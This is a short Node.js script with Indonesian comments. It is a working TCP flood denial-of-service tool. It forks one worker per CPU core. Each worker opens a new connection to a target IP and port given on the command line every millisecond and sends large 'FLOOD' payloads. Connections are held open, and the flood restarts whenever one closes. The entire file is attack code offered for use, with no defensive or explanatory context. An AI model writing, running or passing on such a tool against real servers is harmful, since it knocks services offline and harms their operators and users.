const net = require('net');
const cluster = require('cluster');
const os = require('os');
const numCPUs = os.cpus().length || 4; // Default 4 CPU jika gagal mendeteksi

if (cluster.isMaster) {
    // Fork workers sesuai jumlah CPU yang ada
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    console.log(`Memulai TCP flood dengan ${numCPUs} threads...`);
} else {
    const IP_TARGET = process.argv[2];
    const PORT_TARGET = parseInt(process.argv[3]);

    if (!IP_TARGET || !PORT_TARGET) {
        console.error('Contoh penggunaan: node tcp {ip} {port}');
        process.exit(1);
    }

    function startFlood() {
        setInterval(() => {
            const socket = new net.Socket();
            socket.connect(PORT_TARGET, IP_TARGET, () => {
                // Koneksi berhasil dibuat, tetap aktif
                socket.write('FLOOD'.repeat(1024));  // Kirim data yang besar ke server
            });

            socket.on('error', (err) => {
                console.error('Gagal membuat koneksi TCP:', err);
            });

            // Jangan menutup koneksi, terus lakukan flooding
            socket.on('close', () => {
                startFlood(); // Coba lagi jika koneksi terputus
            });
        }, 1); // Interval pengiriman setiap 1ms
    }

    startFlood();
}
